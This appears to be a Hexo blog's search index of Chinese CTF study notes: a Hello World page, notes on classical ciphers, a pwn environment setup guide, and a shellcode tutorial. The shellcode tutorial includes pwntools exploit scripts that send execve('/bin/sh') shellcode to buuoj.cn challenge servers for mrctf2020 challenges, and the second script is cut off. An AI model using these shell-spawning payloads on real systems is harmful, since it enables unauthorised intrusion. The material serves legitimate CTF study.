<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Hello World</title>
    <url>/2021/10/02/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<span id="more"></span>
<h2 id="扩及扩及-hello-hex"><a class="header-anchor" href="#扩及扩及-hello-hex">¶</a>扩及扩及 hello hex</h2>
<h2 id="Quick-Start"><a class="header-anchor" href="#Quick-Start">¶</a>Quick Start</h2>
<h3 id="Create-a-new-post"><a class="header-anchor" href="#Create-a-new-post">¶</a>Create a new post</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a class="header-anchor" href="#Run-server">¶</a>Run server</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a class="header-anchor" href="#Generate-static-files">¶</a>Generate static files</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a class="header-anchor" href="#Deploy-to-remote-sites">¶</a>Deploy to remote sites</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>古典密码</title>
    <url>/2021/10/03/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81/</url>
    <content><![CDATA[<h1>Crypto入门之古典篇</h1>
<h2 id="1-古典密码概述"><a class="header-anchor" href="#1-古典密码概述">¶</a>1.古典密码概述</h2>
<blockquote>
<ul>
<li>古典密码是密码学中的其中一个类型，其大部分加密方式都是利用<em><strong>替换式密码</strong></em> 或 <em><strong>移项式密码</strong></em>，有时则是两者的混合。其于历史中经常使用，但现代已经很少使用，大部分的已经不再使用了。一般而言，经典密码是基于一个拼音字母（像是A-Z）、动手操作或是简单的设备。它们可能是一种简单的密码法，以致于不可信赖的地步，特别是有新技术被发展出来后。</li>
</ul>
</blockquote>
   <span id="more"></span>
<p>古典密码通常极容易破解，大部分经典密码都很容易受到唯密文攻击法攻击（cipher text only attack）。而像凯撒这种密钥数有限的密码则容易受到爆破密钥的方式破解，替代式密码有比较大的密钥数，但是容易被频率分析，因为每个密码字母各代表了一个明文字母。多字母替代式密码密码，像是维吉尼亚密码使用多个替换防止了简单的频率分析，然而，更先进的技术卡西斯基试验就可用来破解这类密码。<br>
所以，在主流的CTF比赛中，一般不会把某种古典密码作为一个题目的核心知识点来考，在比赛中遇到时，一般在搜索引擎中搜索就可以解决。</p>
<h2 id="2-编码"><a class="header-anchor" href="#2-编码">¶</a>2.编码</h2>
<h3 id="2-1-base编码"><a class="header-anchor" href="#2-1-base编码">¶</a>2.1 base编码</h3>
<pre><code>Base64
    Base64是目前网络上最常见的用于传输8bit字节码的编码方式之一，是一种基于64个可打印字符来表示二进制数据的方法。在编码时，3个字节的数据先后（先来的字节占高位）放入一个24位的缓冲区，数据不足3字节时则用0来补足。每次选出6bit按照其值来选择 &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot; 中的字符作为编码输出，若原数据长度len mod 3 = 1 则在编码后加两个&quot;=&quot;,若len mod 3 =2 则加一个&quot;=&quot;,而当刚好为3的倍数时则不会出现等号，如下图。从下图中不难发现当原数据长度不为3的倍数时，在编码时会再末位补0使其成为6的倍数，而在解码时会自动去掉所补的0，如果在编码的时候不全用0位填充而将我们想隐藏的数据放入其中，也并不会影响编码的结果，这就引出了另外一个CTF题型：Base64隐写。
</code></pre>
<p><img src="http://static.zybuluo.com/hgggg/088gcrbndggz0d84gpzhfe19/20191230221011783.png" alt="20191230221011783.png-15.6kB"><br>
<img src="http://static.zybuluo.com/hgggg/mluejayhvknagd7w429ope1h/20191230221143554%20%281%29.png" alt="20191230221143554 (1).png-15.2kB"><br>
<img src="http://static.zybuluo.com/hgggg/d87dlk5xkqgua437bou3wyt2/20191230221118387.png" alt="20191230221118387.png-14.3kB"></p>
<pre><code>其它Base编码
    除了Base64以外，Baes32和Base16也是较为常见的Base编码，它们的编码原理和Basa64一样，后者Base16也是我们常说的Hex编码即16进制，除此之外还有Base58、Baes36、Base91、uuencode、xxencode等也曾出现在CTF的比赛中，它们原理类似，只不过它们使用的码表不同，而在比赛中也常有替换码表的Baes题目。
</code></pre>
<h3 id="2-2-其他常见编码"><a class="header-anchor" href="#2-2-其他常见编码">¶</a>2.2 其他常见编码</h3>
<pre><code>ASCII码：包含大小写字母，数字，常见符号等，是互联网通用语言
摩斯电码：由点（.）、划（—）组成
URL编码：又称百分号编码、只是简单的在特殊字符的各个字节前加上%
jjencode&amp;aaencode:针对JS的编码方式，前者将JS代码转为符号和字符串、后者将之转换为常用网络表情
一般地，编码只是对原始数据进行一定地处理，使其变得方便传输、储存等操作，并不是为了加密信息，也没有密钥等额外信息，只要知道编码方式就可以还原得到数据内容。
</code></pre>
<h2 id="3-单表替换密码"><a class="header-anchor" href="#3-单表替换密码">¶</a>3.单表替换密码</h2>
<h3 id="3-1单表替换原理"><a class="header-anchor" href="#3-1单表替换原理">¶</a>3.1单表替换原理</h3>
<pre><code>单表代换是指英文字母在进行密码编码替换的时候，有一张对照表，也就是说，对于每一个字母，都是唯一对应的。
例如源字母表为：abcdefghijklmnopqrstuvwxyz
码表为：qwertyuiopasdfghjklzxcvbnm
</code></pre>
<p>加密：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#s为码表,m为密文</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">m,s</span>)&#123;</span></span><br><span class="line"><span class="function">    <span class="title">c</span> = &quot;&quot;</span></span><br><span class="line"><span class="function">    <span class="title">for</span> <span class="title">i</span> <span class="title">in</span> <span class="title">range</span> (<span class="params"><span class="number">0</span>,<span class="built_in">len</span>(<span class="params">m</span>)</span>):</span></span><br><span class="line">        k = <span class="built_in">ord</span>(m[i])-<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">        c += s[k]</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>解密：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">c,s</span>):</span></span><br><span class="line">    t = <span class="string">&quot;&quot;</span></span><br><span class="line">    m = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(c)):</span><br><span class="line">        t = c[i]</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(s)):</span><br><span class="line">            <span class="keyword">if</span> t==s[k]:</span><br><span class="line">                m += <span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)+k)</span><br><span class="line">    <span class="keyword">return</span> m</span><br></pre></td></tr></table></figure>
<h3 id="凯撒密码"><a class="header-anchor" href="#凯撒密码">¶</a>凯撒密码</h3>
<pre><code>凯撒密码是一种最为简单的替换密码，即字母表上的所有的字母向一个方向偏移n位后被替换为密文，如：当n=2时，A就被替换成了C，凯撒及其变种经常会出现在CTF古典密码学的题目中，其加解密公式为：
</code></pre>
<p><img src="http://static.zybuluo.com/hgggg/fyyuo0q5dhv857h3n7ga45ap/123456.png" alt="123456.png-10.7kB"></p>
<pre><code>    由此可以看出，当我们知道一串密文是由凯撒加密得来的时候，即使我们不知到密钥，也可以通过穷举法轻易的破解。
</code></pre>
<h3 id="仿射密码（Affine-cipher）"><a class="header-anchor" href="#仿射密码（Affine-cipher）">¶</a>仿射密码（Affine cipher）</h3>
<pre><code>仿射密码作为一种单表替换密码，码表的每个字母相应的值使用一个简单的数学函数对应一个数值
其加解密公式如下：
</code></pre>
<p>加密：<img src="http://static.zybuluo.com/hgggg/ipwe3sgrjdy67i3wrq742axh/123456%20%282%29.png" alt="123456 (2).png-2.8kB"><br>
解密：<img src="http://static.zybuluo.com/hgggg/mrl6gjagmgqzmwfwp9r8rc4t/123456%20%283%29.png" alt="123456 (3).png-3.1kB"><br>
乘法逆元求法：<img src="http://static.zybuluo.com/hgggg/xw1my1dv05jobvaaocdtgzyd/123456%20%284%29.png" alt="123456 (4).png-1.8kB"><br>
<em><strong>关于公式</strong></em></p>
<pre><code>a与m互素，m=26,x为原文，b为偏移量
</code></pre>
<p><em><strong>关于乘法逆元</strong></em></p>
<pre><code>    例如，求5关于模14的乘法逆元：14=5*2+4，5=4*1+1说明5与14互素，存在5关于14的乘法逆元。1=5-4=5-(14-5*2)=5*3-14因此，5关于模14的乘法逆元为3。
</code></pre>
<p><em><strong>破解</strong></em></p>
<pre><code>若a=1,则刚好就是凯撒密码。
若a!=1,我们可以知道m=26，a与m互素，即可得到的取值范围为：1，3，5，7，9，11，13，15，17，19，21，23，25中的一个，所以一共有12*26=312种可能的密钥，此时采用穷举法即可攻击。
若我们已经知道了两个加密后的字母c1,c2。那么通过公式c1 = a(x1+b) mod m ; c2 = a(x2+b) mod m;则c1-c2可得：c1-c2=a(x1-x2) mod m即可求解a，再用穷举法得到b。
</code></pre>
<h2 id="4-多表替换密码"><a class="header-anchor" href="#4-多表替换密码">¶</a>4.多表替换密码</h2>
<h3 id="4-1多表替换原理"><a class="header-anchor" href="#4-1多表替换原理">¶</a>4.1多表替换原理</h3>
<pre><code>由于单表替换密码容易被频率分析破解，人们提出了多表替换加密，即用多个码表来依次对明文消息的字母进行代换。相较于单表替换，多表替换后，密文几乎不再保持原来的频率，所以更加难以破解，我们一般只能通过寻找算法实现对应的弱点进行破解。在多表替换中，以Playfair、Vigenere、Nihilist、Hill等较为出名，这里我们指选择分析其中的几种。
</code></pre>
<h3 id="4-2autokey-维吉尼亚"><a class="header-anchor" href="#4-2autokey-维吉尼亚">¶</a>4.2autokey/维吉尼亚</h3>
<pre><code>维吉尼亚密码，作为最经典的多表密码，其码表如下图：
码表第一排对应明文，第一列对应密钥。例如：
明文为：i like crypto
密钥为：nssctf
密文为：v damx heqhvh
</code></pre>
<p>破解<br>
由于维吉尼亚密码属于多表加密，所以一个字母可能被加密成不同的密文，由于密钥是重复使用的，所以只要知道了密钥的长度，就可以将其看成是交织在一起的凯撒密码，每一个都可以单独破解。密钥长度可以使用卡西斯基试验来得到。</p>
<p><img src="http://static.zybuluo.com/hgggg/er0k0mqmiaxoeo4ktiw98ioc/1587018-20191126194722022-992570273.jpg" alt="1587018-20191126194722022-992570273.jpg-207.2kB"></p>
<pre><code>Autokey与维吉尼亚密码密码类似，自动密钥密码（Autokey）主要有两种，关键词自动密钥密码和原文自动密钥密码。所以它比维吉尼亚更加安全。下面我们以关键词自动密钥为例：
明文：THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG
关键词：CULTURE
自动生成密钥：CULTURE THE QUICK BROWN FOX JUMPS OVER THE
密文：VBP JOZGD IVEQV HYY AIICX CSNL FWW ZVDP WVK
</code></pre>
<h3 id="4-3希尔密码"><a class="header-anchor" href="#4-3希尔密码">¶</a>4.3希尔密码</h3>
<pre><code>希尔密码（Hill）使用每个字母在字母表中的顺序作为其对应的数字，即A=0，B=1，C=2 等，然后将明文转化为 n 维向量，跟一个 n × n 的矩阵相乘，再将得出的结果模 26。加密矩阵必须是可逆的，否则就不可能解码。只有矩阵的行列式和 26 互质，才是可逆的。
</code></pre>
<p>加密：<br>
<img src="http://static.zybuluo.com/hgggg/geep66492gw4cd9jwo6yamm1/123456%20%285%29.png" alt="123456 (5).png-68.1kB"><br>
解密：<br>
求出加密矩阵的逆矩阵然后同密文相乘后再对等到的矩阵模26(人懒就不上图了)</p>
<h2 id="5-其他密码"><a class="header-anchor" href="#5-其他密码">¶</a>5.其他密码</h2>
<h4 id="培根密码："><a class="header-anchor" href="#培根密码：">¶</a>培根密码：</h4>
<p><img src="http://static.zybuluo.com/hgggg/7alys7nj2040f01lc4mmbzj7/123456.png" alt="123456.png-19.2kB"></p>
<h4 id="栅栏密码："><a class="header-anchor" href="#栅栏密码：">¶</a>栅栏密码：</h4>
<pre><code>所谓栅栏密码，就是把要加密的明文分成N个一组，然后把每组的第1个字连起来，形成一段无规律的话。
</code></pre>
<h4 id="JSFuck"><a class="header-anchor" href="#JSFuck">¶</a>JSFuck:</h4>
<p>形如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()</span><br><span class="line">原作者github:https://github.com/aemkei/jsfuck</span><br></pre></td></tr></table></figure>
<h4 id="BrainFuck"><a class="header-anchor" href="#BrainFuck">¶</a>BrainFuck</h4>
<pre><code>一种极小众的计算机语言，由“&gt;、&lt;、+、-、.、,、[、]&quot;八个符号组成。该语言由目前有专门的解释器，感兴趣可以自行了解。
</code></pre>
<h4 id="猪圈及其变形"><a class="header-anchor" href="#猪圈及其变形">¶</a>猪圈及其变形</h4>
<pre><code>猪圈密码（亦称朱高密码、共济会暗号、共济会密码或共济会员密码），是一种以格子为基础的简单替代式密码。即使使用符号，也不会影响密码分析，亦可用在其它替代式的方法。
</code></pre>
<p><img src="http://static.zybuluo.com/hgggg/j5ds8cf7kr3ivkob7dbyhniv/123456.jpg" alt="123456.jpg-26.6kB"></p>
<h4 id="跳舞的小人"><a class="header-anchor" href="#跳舞的小人">¶</a>跳舞的小人</h4>
<pre><code>出自《福尔摩斯》的密码
</code></pre>
<p><img src="http://static.zybuluo.com/hgggg/g6nj57kk1444l2zizplrhla0/123456%20%282%29.jpg" alt="123456 (2).jpg-23.3kB"></p>
<h4 id="来自宇宙的信号"><a class="header-anchor" href="#来自宇宙的信号">¶</a>来自宇宙的信号</h4>
<p><img src="http://static.zybuluo.com/hgggg/9rbnfvwqapog0zs4at0bqzuw/20180310123813709.png" alt="20180310123813709.png-92.4kB"></p>
<h4 id="古精灵码"><a class="header-anchor" href="#古精灵码">¶</a>古精灵码</h4>
<p><img src="http://static.zybuluo.com/hgggg/zrn18wxlgf7gi88475gs61ni/55409313b07eca805f84325b982397dda044835e.jpg" alt="55409313b07eca805f84325b982397dda044835e.jpg-29.3kB"></p>
<pre><code>除了以上列出来的这些，还有盲文、数字盲文、音符加密、01248、与佛论禅等也曾出现在CTF比赛中。
</code></pre>
<h3 id="6-常用网站"><a class="header-anchor" href="#6-常用网站">¶</a>6.常用网站</h3>
<pre><code>http://ctf.ssleye.com/#
https://quipqiup.com/
</code></pre>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>古典密码</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn入门之环境搭建</title>
    <url>/2021/10/04/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<h1>VMware下的ctf(pwn)入门环境搭建</h1>
<h2 id="工具"><a class="header-anchor" href="#工具">¶</a>工具</h2>
<p>VMware15</p>
<p>unbuntu20.0镜像 下载地址：</p>
<pre><code>http://mirrors.163.com/ubuntu-releases/20.04/
</code></pre>
<p>详情请见https://blog.csdn.net/weixin_44169941/article/details/109263134</p>
<span id="more"></span>   
<h2 id="pwn环境搭建"><a class="header-anchor" href="#pwn环境搭建">¶</a>pwn环境搭建</h2>
<p>1.安装vscode</p>
<pre><code>直接在Ubuntu software 安装就行
</code></pre>
<p>2.安装gcc</p>
<pre><code>sudo apt install gcc
gcc --version  
</code></pre>
<p>3.配置32位环境</p>
<pre><code>sudo dpkg --add-architecture i386
sudo apt-get update
sudo apt install build-essential
sudo apt install gcc-multilib
</code></pre>
<p>4.安装vim</p>
<pre><code>sudo apt install vim
</code></pre>
<p>5.安装git</p>
<pre><code>sudo apt install git
</code></pre>
<p>6.安装pwntools</p>
<pre><code>sudo apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential
sudo python3 -m pip install --upgrade pip
sudo python3 -m pip install --upgrade pwntools
</code></pre>
<p>7.安装pwndbg + pwngdb 联合调试环境</p>
<p>pwngdb</p>
<pre><code>cd ~/
git clone https://github.com/scwuaptx/Pwngdb.git 
cp ~/Pwngdb/.gdbinit ~/
</code></pre>
<p>pwndbg</p>
<pre><code>git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh
</code></pre>
<p>联合使用</p>
<pre><code>vim ~/.gdbinit
注释掉第一行 然后在第二行写入
source ~/pwndbg/gdbinit.py
</code></pre>
<p>食用方法汇总（持续）</p>
<pre><code>1.带源码调试: gdb -q [file] -d [path]（默认为.）
2.下断点: b address
3.运行: r
4.继续: c
5.运行下一步: ni
6.打印链接库: vmmap
7.输出libc_base: libc
8.查看堆: heap，parseheap
9.查看bins: bin
10.查看address处的内存 x /nxg adress
11.打印地址/指针：p address
12.查看栈：stack length
13.查看地址：telescoope address
14.查看hex: hex address
15.格式化字符串偏移地址: fmtarg 
</code></pre>
<p>8.安装docker</p>
<pre><code>sudo apt install docker.io
</code></pre>
<p>9.安装seccomp-tools</p>
<pre><code>sudo apt install gcc ruby-dev
gem install seccomp-tools
</code></pre>
<p>10.安装one_gadget</p>
<pre><code>sudo gem install one_gadget
</code></pre>
<p>11.安装LibcSearcher</p>
<pre><code>sudo pip3 install LibcSearcher
sudo pip3 install -U LibcSearcher
</code></pre>
<p>12.安装main_arena_offset</p>
<pre><code>git clone https://github.com/dev2ero/py_main_arena_offset.git
cd py_main_arena_offset
sudo python3 setup.py develop
</code></pre>
<p>食用方法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pymao <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc = <span class="string">&quot;./libc.so.6&quot;</span></span><br><span class="line">main_arena_offset = gmao( libc )</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(main_arena_offset))</span><br></pre></td></tr></table></figure>
<p>13.安装本地调试不同版本的libc环境</p>
<p>glibc-all-in-one</p>
<pre><code>git clone https://github.com/matrix1001/glibc-all-in-one.git
cd glibc-all-in-one
python3 update_list
cat list
 ./download [libc-version]
</code></pre>
<p>patchelf</p>
<pre><code>git clone https://github.com/NixOS/patchelf.git
cd patchelf
sudo apt-get install autoconf automake libtool
./bootstrap.sh
./configure
make
sudo make install
</code></pre>
<p>食用方法</p>
<pre><code>patchelf --replace-needed libc.so.6 [your-libc-path] [yourelf]
patchelf --set-interpreter [libc-ld-path] [elf]
cp -r ~/Desktop/glibc-all-in-one/libs/[libcfolderpath]/.debug/ ./debug
gdb [elf]
# set debug-file-directory ./debug/
如果要debug不同版本的libc的程序具体可以看这篇博客：https://bbs.pediy.com/thread-254868.htm
如果上述博客中方法不可行，则可以修改~/pwndbg/pwndbg/symbol.py 最后两行为set_directory('./debug/')
</code></pre>
<p>14.安装并配置python2</p>
<pre><code>#安装
sudo apt install python2 
#设置优先级
sudo update-alternatives --install /usr/bin/python python /usr/bin/python2.7 1 
sudo update-alternatives --install /usr/bin/python python /usr/bin/python3.8 2
#手动切换
sudo update-alternatives --config python
#安装pip及依赖
sudo apt install  python-dev git libssl-dev libffi-dev build-essential
sudo apt-get install curl
sudo curl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip.py
sudo python get-pip.py
pip install pwntoola
</code></pre>
<p>15.安装alpha3</p>
<pre><code>git clone https://github.com/TaQini/alpha3.git
cd alpha3
python ./ALPHA3.py x64 ascii mixedcase rax --input=&quot;sc.bin&quot; &gt; out.bin
</code></pre>
<p>16.搭建docker用的镜像</p>
<pre><code>https://github.com/DASCTF-Base
</code></pre>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>环境搭建</tag>
      </tags>
  </entry>
  <entry>
    <title>shellcode</title>
    <url>/2021/10/04/shellcode/</url>
    <content><![CDATA[<h1>Shellcode</h1>
<h3 id="原理"><a class="header-anchor" href="#原理">¶</a>原理</h3>
<pre><code>在pwn中shellcode利用方式一般为触发中断（int 0x80 或 syscall）来进行系统调用
system(&quot;/bin/sh&quot;)，实际上就是调用execve(&quot;/bin/sh&quot;,0,0)
</code></pre>
<span id="more"></span>
<h3 id="示例程序"><a class="header-anchor" href="#示例程序">¶</a>示例程序</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//gcc -m32 1.c -o shell</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="syscall-调用表"><a class="header-anchor" href="#syscall-调用表">¶</a>syscall 调用表</h3>
<pre><code>https://publicki.top/syscall.html
</code></pre>
<h3 id="使用pwntools生成shellcode"><a class="header-anchor" href="#使用pwntools生成shellcode">¶</a>使用pwntools生成shellcode</h3>
<p>32位</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span>  pwn <span class="keyword">import</span>  *</span><br><span class="line">context(log_level= <span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;1386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br></pre></td></tr></table></figure>
<p>64位</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span>  pwn <span class="keyword">import</span>  *</span><br><span class="line">context(log_level= <span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br></pre></td></tr></table></figure>
<p>mips</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span>  pwn <span class="keyword">import</span>  *</span><br><span class="line">context(log_level= <span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;mips&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.mips.linux.sh())</span><br></pre></td></tr></table></figure>
<p>arm</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span>  pwn <span class="keyword">import</span>  *</span><br><span class="line">context(log_level= <span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;aarch64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.aarch64.linux.sh())</span><br></pre></td></tr></table></figure>
<p><strong>坑</strong></p>
<pre><code>在运行生成mips和arm架构的shellcode时会有一系列的报错
这里给出解决方案
git clone https://github.com/Gallopsled/pwntools-binutils
cd pwntools-binutils/ubuntu
chmod +x install_all.sh
./install_all.sh arm
</code></pre>
<h3 id="例题"><a class="header-anchor" href="#例题">¶</a>例题</h3>
<h4 id="mrctf2020-shellcode"><a class="header-anchor" href="#mrctf2020-shellcode">¶</a>mrctf2020_shellcode</h4>
<p><img src="http://static.zybuluo.com/hgggg/8spatck2bpkcvt8mm9zt1fcz/1.png" alt="1.png-65.6kB"></p>
<p>从ida中我们可以看到，程序的功能为读入0x400字节，然后执行读入的内容<br>
<img src="http://static.zybuluo.com/hgggg/yy6gc7b9ficlvskr65bow8oi/2.png" alt="2.png-150.2kB"></p>
<p>同时栈上有可执行权限</p>
<p>那接下来编写exp</p>
<h5 id="exp"><a class="header-anchor" href="#exp">¶</a>exp</h5>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span>  pwn <span class="keyword">import</span>  *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;,&#x27;sp&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line">sh = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26936</span>)</span><br><span class="line"><span class="comment">#sh = process(&#x27;mrctf2020_shellcode&#x27;)</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">shellcode1 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rbx, 0x68732f6e6922f</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    push rsp</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    xor esi,esi</span></span><br><span class="line"><span class="string">    xor edx,edx</span></span><br><span class="line"><span class="string">    push 0x3b</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode1 = asm(shellcode1)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Show me your magic!&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">sh.send(shellcode)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>但是在CTF比赛中往往会对输入长度进行限制所以有时也需要自己编写shellcode</p>
<h4 id="mrctf2020-shellcode-revenge"><a class="header-anchor" href="#mrctf2020-shellcode-revenge">¶</a>mrctf2020_shellcode_revenge</h4>
<p>本题与上一题相似，不过却只能用可见字符构造shellcode,这里使用alpha3来生成<br>
<img src="http://static.zybuluo.com/hgggg/uh8qelgi14ohooggd5leq8xx/3.png" alt="3.png-91kB"></p>
<h5 id="exp-v2"><a class="header-anchor" href="#exp-v2">¶</a>exp</h5>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> ```python</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">29931</span>)</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;Show me your magic!\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">shellcode1 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rbx, 0x68732f6e6922f</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    push rsp</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    xor esi,esi</span></span><br><span class="line"><span class="string">    xor edx,edx</span></span><br><span class="line"><span class="string">    push 0x3b</span></span><br><span class="line"><span 